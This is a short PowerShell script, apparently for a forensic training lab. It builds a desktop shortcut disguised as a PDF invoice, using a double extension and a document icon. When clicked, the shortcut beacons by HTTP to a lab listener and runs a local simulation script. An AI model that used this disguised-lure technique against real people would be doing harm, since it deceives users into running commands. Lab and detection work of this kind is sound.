# =====================================================================
# Forensic Lab Lure Generator (safe stand-in)
# ---------------------------------------------------------------------
# Purpose: creates a desktop shortcut that, when double-clicked, opens
# a VISIBLE PowerShell window and makes a single outbound HTTP GET
# request to the lab's beacon listener on the Kali VM. It then calls
# a separate, local, non-destructive script (simulate_impact.ps1) that
# only RENAMES dummy canary files - it never reads, transforms, or
# deletes their contents.
#
# This script does not hide its window, does not fetch or execute any
# remote code, and does not perform any form of encryption.
# =====================================================================

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$HOME\Desktop\Invoice_March2025.pdf.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments  = "-NoExit -Command `"Write-Host 'Opening invoice...'; " +
    "Invoke-WebRequest -Uri 'http://192.168.56.10:8080/' -UseBasicParsing | Out-Null; " +
    "& 'C:\Tools\simulate_impact.ps1'`""
$Shortcut.IconLocation = "shell32.dll,1"
$Shortcut.Save()

Write-Host "[+] Lab lure shortcut created on Desktop: Invoice_March2025.pdf.lnk"
Write-Host "[i] This shortcut opens a VISIBLE PowerShell window, makes one HTTP GET"
Write-Host "    to 192.168.56.10:8080, then runs the local impact-simulation script."
